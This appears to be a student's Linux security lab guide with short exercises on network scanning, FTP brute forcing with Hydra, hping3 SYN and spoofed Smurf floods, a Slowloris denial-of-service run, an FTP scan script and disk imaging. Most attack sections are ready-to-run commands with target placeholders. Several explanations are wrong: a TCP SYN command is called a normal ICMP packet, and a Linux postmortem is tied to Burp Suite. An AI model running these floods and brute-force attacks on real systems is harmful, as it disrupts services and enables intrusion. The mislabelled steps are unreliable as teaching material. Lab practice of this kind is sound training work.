# Linux Security Lab Guide

This guide provides a series of cybersecurity explorations, including practical exercises and case studies.

## EXP1: Client-side Vulnerability Exploration

### Discovery Phase:

1. Use `netdiscover` to discover devices on the network.
   ```bash
   netdiscover
   ```

2. Use `nmap` to perform a detailed scan of the target IP address.
   ```bash
   nmap -A <ip_addr>
   ```

3. Utilize `enum4linux` for additional enumeration.
   ```bash
   enum4linux <ip_addr>
   ```

### Wordlist Generation:

1. Create a wordlist for potential passwords.

### FTP Brute Force Attack:

1. Use Hydra to brute force FTP login credentials.
   ```bash
   hydra -L <username_list> -P <password_list> <ip_addr> ftp
   ```

## EXP2: ICMP Packet Spoofing

### Explore various ICMP packet spoofing attacks using `hping3`:

1. Normal ICMP packet.
   ```bash
   hping3 -S -p 80 <target_ip>
   ```

2. SYN attack.
   ```bash
   hping3 -S -p 80 <target_ip> --flood
   ```

3. LAN attack.
   ```bash
   hping3 -S -p 80 <target_ip> -a <spoofed_ip>
   ```

4. Smurf attack.
   ```bash
   hping3 --icmp --flood <target_ip> -a <spoofed_ip>
   ```

5. Random Smurf attack.
   ```bash
   hping3 -S -p 80 <target_ip> --flood --rand-source
   ```

6. TCP sequence prediction attack.
   ```bash
   hping3 -S -p 80 -Q <target_ip>
   ```

## EXP3: Script for FTP Server Analysis

1. Create a script `ftp.sh` for FTP server analysis.

```bash
vi ftp.sh
```

```bash
chmod +x ftp.sh

echo "Enter IP address:"
read ip
echo "Scanning for FTP port"
nmap -A $ip

echo "Enter 'y' if FTP is open or enter 'n' if FTP is closed"
read con 
if [ "$con" = "y" ]; then 
    echo "Checking for anonymous login"
    nmap $ip -p 21 --script ftp-anon
    echo "Close"
fi
```

## EXP4: Transport Attack Exploration

1. Use Wireshark for traffic analysis.
   - Filter traffic for HTTP protocol.

## EXP5: CIA Case Study

1. Study a case study involving confidentiality, integrity, and availability (CIA) concerns.

## EXP6: Denial of Service (DoS) Attack

1. Perform a DoS attack using Slowloris on the target system.
   ```bash
   git clone https://github.com/gkbrk/slowloris
   cd slowloris
   python3 slowloris.py <target_ip> -s 500
   ```

## EXP7: Bit Stream Image Analysis

1. Analyze a bit stream image to extract information from a disk image.
   ```bash
   df
   dd if=/dev/sda1 of=disk_image.img
   ls
   ```
## EXP8: Postmortem Linux

1. Conduct a postmortem analysis of a Linux system using Burp Suite on a vulnerable web page.

